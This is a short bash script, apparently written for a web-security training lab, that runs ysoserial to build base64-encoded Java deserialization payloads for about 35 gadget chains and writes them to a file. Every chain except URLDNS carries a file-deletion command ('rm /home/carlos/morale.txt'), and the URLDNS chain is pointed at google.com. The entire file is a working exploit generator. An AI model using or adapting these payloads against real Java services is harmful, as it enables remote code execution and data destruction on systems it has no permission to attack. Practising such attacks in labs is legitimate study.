#!/bin/bash

YSOSERIAL=/home/luca/tools/ysoserial-master-SNAPSHOT.jar
COMMAND="rm /home/carlos/morale.txt"
URL="http://google.com"

java -jar $YSOSERIAL CommonsCollections7 "$COMMAND" | base64 -w0 > payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections6 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections5 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections4 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections3 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections2 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsCollections1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL AspectJWeaver "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL BeanShell1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL C3P0 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Click1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Clojure "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL CommonsBeanutils1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL FileUpload1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Groovy1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Hibernate1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Hibernate2 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL JBossInterceptors1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL JRMPClient "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL JRMPListener "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL JSON1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL JavassistWeld1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Jdk7u21 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Jython1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL MozillaRhino1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL MozillaRhino2 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Myfaces1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Myfaces2 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL ROME "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Spring1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Spring2 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL URLDNS "$URL" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Vaadin1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt
java -jar $YSOSERIAL Wicket1 "$COMMAND" | base64 -w0 >> payloads.txt
echo >> payloads.txt